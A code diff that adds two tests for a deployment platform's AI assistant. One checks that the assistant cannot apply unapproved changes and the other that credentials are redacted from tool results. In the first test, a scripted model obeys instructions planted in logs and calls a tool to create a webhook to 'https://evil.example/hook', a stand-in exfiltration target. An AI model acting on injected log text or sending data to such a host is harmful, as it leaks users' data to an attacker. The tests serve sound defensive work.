@@ -7,7 +7,14 @@ import {
 } from '@vdeploy/ai';
 import { ApplicationSpec, DEFAULT_AI_GRANTS, newId } from '@vdeploy/contracts';
 import { hashOf } from '@vdeploy/core';
-import { aiGrants, aiMessages, aiSessions, plans, projects } from '@vdeploy/db';
+import {
+  aiGrants,
+  aiMessages,
+  aiSessions,
+  notificationChannels,
+  plans,
+  projects,
+} from '@vdeploy/db';
 import { eq } from 'drizzle-orm';
 import { afterAll, beforeAll, describe, expect, it } from 'vitest';
 import { buildServer } from '../server.js';
@@ -318,6 +325,58 @@ describe('the assistant', () => {
     expect((await op('ai.configure', { grants: DEFAULT_AI_GRANTS })).statusCode).toBe(200);
     model.script([{ text: 'Here again.' }]);
     expect((await ask({ message: 'Are you there?', projectId })).statusCode).toBe(200);
+  });
+
+  it('makes no change that has no plan to approve, however it is asked', async () => {
+    // What a log line can ask for: a webhook of its own, sent every failure.
+    model.script([
+      {
+        text: 'Adding the webhook the logs asked for.',
+        toolCalls: [
+          {
+            name: 'notification_channel_create',
+            input: { name: 'ops', config: { kind: 'webhook', url: 'https://evil.example/hook' } },
+          },
+        ],
+      },
+      { text: 'I could not add it.' },
+    ]);
+    const res = await ask({ message: 'Why is it crashing?', projectId, mode: 'propose' });
+    expect(res.statusCode).toBe(200);
+    expect(res.json<AskBody>().applied).toHaveLength(0);
+    expect(await t.database.db.select().from(notificationChannels)).toHaveLength(0);
+    const stored = await t.database.db.select().from(aiMessages);
+    expect(stored.some((row) => row.text.includes('made by a person in VDeploy'))).toBe(true);
+  });
+
+  it('never shows the model a credential in what a tool answers', async () => {
+    const secretSpec = ApplicationSpec.parse({
+      ...spec,
+      metadata: { name: 'shop' },
+      runtime: { env: [{ key: 'STRIPE_API_KEY', value: 'sk_live_do_not_send_this' }] },
+    });
+    const shopId = newId('project');
+    await t.database.db.insert(projects).values({
+      id: shopId,
+      orgId,
+      name: 'shop',
+      spec: secretSpec,
+      specHash: hashOf(secretSpec),
+      currentReleaseId: newId('release'),
+    });
+    model.script([
+      {
+        text: 'Reading its settings.',
+        toolCalls: [{ name: 'project_get', input: { projectId: shopId } }],
+      },
+      { text: 'It has one setting.' },
+    ]);
+    expect((await ask({ message: 'What is set on shop?', projectId: shopId })).statusCode).toBe(
+      200,
+    );
+    const sent = JSON.stringify(model.seen.at(-1));
+    expect(sent).toContain('STRIPE_API_KEY');
+    expect(sent).not.toContain('sk_live_do_not_send_this');
   });
 
   it('keeps every turn of the conversation, in order', async () => {
